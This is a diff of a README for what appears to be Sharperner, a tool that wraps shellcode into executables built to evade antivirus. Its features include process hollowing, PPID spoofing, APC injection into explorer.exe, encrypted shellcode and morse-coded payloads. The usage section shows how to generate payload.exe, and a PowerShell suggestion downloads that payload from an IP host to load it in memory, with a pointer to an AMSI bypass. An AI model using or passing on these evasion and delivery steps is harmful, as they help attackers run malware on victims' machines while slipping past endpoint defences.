@@ -3,15 +3,21 @@
 
 ![](./src/images/scan.PNG)
 
-### Features
-* Support multiple shellcode input
-* AES + XOR encrypted shellcode
-* APC Process Injection (explorer.exe)
-* Process Hollowing + PPID Spoofing
+## Features
+### PE binary
+* Process Hollowing
+* PPID Spoofing
 * Random generated AES key and iv
 * Final Shellcode, Key and IV are translated to morse code :)
 
-### Usage
+### .NET binary
+* AES + XOR encrypted shellcode
+* APC Process Injection (explorer.exe)
+* Random function names
+* Random generated AES key and iv
+* Final Shellcode, Key and IV are translated to morse code :)
+
+## Usage
 ```
 /file       B64,hex,raw shellcode
 /type       cs,cpp
@@ -22,7 +28,7 @@ Sharperner.exe /file:file.txt /type:cpp
 Sharperner.exe /file:file.txt /out:payload.exe
 ```
 
-### Suggestion
+## Suggestion
 To avoid touching the disk, Generated .NET executable can be loaded reflectively with powershell. AMSI is the enemy now, [amsi.fail](https://amsi.fail) ftw!
 ```powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/payload.exe')
